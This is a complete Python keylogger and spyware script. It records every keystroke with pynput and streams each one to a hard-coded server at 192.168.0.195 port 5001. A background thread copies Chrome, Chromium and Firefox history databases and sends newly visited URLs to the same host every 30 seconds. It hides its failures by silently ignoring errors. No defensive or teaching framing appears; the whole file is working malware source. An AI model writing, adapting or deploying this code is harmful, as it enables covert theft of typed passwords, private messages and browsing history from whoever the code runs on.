import socket
from pynput import keyboard
from datetime import datetime
import threading
import time
import os
import sqlite3
import shutil

SERVER_IP = '192.168.0.195'
SERVER_PORT = 5001

# Track last seen URLs to avoid duplicates
seen_urls = set()

# Paths for browser history
CHROME_HISTORY_PATH = os.path.expanduser('~/.config/google-chrome/Default/History')
CHROMIUM_HISTORY_PATH = os.path.expanduser('~/.config/chromium/Default/History')
FIREFOX_PROFILE_DIR = os.path.expanduser('~/.mozilla/firefox')


def send_log(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode())
    except Exception:
        pass

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f'<{key}>'
    send_log(k)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def get_chrome_history(path):
    urls = []
    if os.path.exists(path):
        # Copy the file to avoid lock issues
        tmp_path = '/tmp/chrome_history_copy'
        try:
            shutil.copy2(path, tmp_path)
            conn = sqlite3.connect(tmp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20')
            for url, _ in cursor.fetchall():
                urls.append(url)
            conn.close()
            os.remove(tmp_path)
        except Exception:
            pass
    return urls

def get_firefox_history():
    urls = []
    if os.path.exists(FIREFOX_PROFILE_DIR):
        for profile in os.listdir(FIREFOX_PROFILE_DIR):
            places_path = os.path.join(FIREFOX_PROFILE_DIR, profile, 'places.sqlite')
            if os.path.exists(places_path):
                tmp_path = '/tmp/firefox_history_copy'
                try:
                    shutil.copy2(places_path, tmp_path)
                    conn = sqlite3.connect(tmp_path)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 20')
                    for url, _ in cursor.fetchall():
                        urls.append(url)
                    conn.close()
                    os.remove(tmp_path)
                except Exception:
                    pass
    return urls

def browser_history_monitor():
    while True:
        urls = set()
        # Chrome/Chromium
        urls.update(get_chrome_history(CHROME_HISTORY_PATH))
        urls.update(get_chrome_history(CHROMIUM_HISTORY_PATH))
        # Firefox
        urls.update(get_firefox_history())
        new_urls = urls - seen_urls
        for url in new_urls:
            send_log(f'[BROWSER] {url}\n')
        seen_urls.update(new_urls)
        time.sleep(30)

def start_browser_monitor():
    t = threading.Thread(target=browser_history_monitor, daemon=True)
    t.start()

if __name__ == '__main__':
    start_browser_monitor()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() 